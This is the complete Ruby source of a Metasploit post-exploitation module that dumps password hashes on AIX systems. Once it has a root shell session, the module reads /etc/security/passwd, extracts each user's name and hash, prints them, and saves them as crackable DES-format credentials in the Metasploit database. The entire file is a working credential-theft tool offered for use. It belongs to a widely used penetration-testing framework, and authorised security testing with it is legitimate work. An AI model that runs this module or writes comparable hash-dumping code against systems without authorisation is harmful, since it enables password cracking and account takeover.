##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AIX Gather Dump Password Hashes',
        'Description'   => %q{ Post Module to dump the password hashes for all users on an AIX System},
        'License'       => MSF_LICENSE,
        'Author'        => ['theLightCosine'],
        'Platform'      => [ 'aix' ],
        'SessionTypes'  => [ 'shell' ]
      ))

  end


  def run
    if is_root?
      passwd_file = read_file("/etc/security/passwd")

      username = ''
      hash     = ''

      passwd_file.each_line do |line|
        user_line = line.match(/(\w+):/)
        if user_line
          username = user_line[1]
        end

        hash_line = line.match(/password = (\w+)/)
        if hash_line
          hash = hash_line[1]
        end

        if hash.present?
          print_good "#{username}:#{hash}"
          credential_data = {
              jtr_format: 'des',
              origin_type: :session,
              post_reference_name: self.refname,
              private_type: :nonreplayable_hash,
              private_data: hash,
              session_id: session_db_id,
              username: username,
              workspace_id: myworkspace_id
          }
          create_credential(credential_data)
          username = ''
          hash     = ''
        end
      end

    else
      print_error("You must run this module as root!")
    end

  end
end
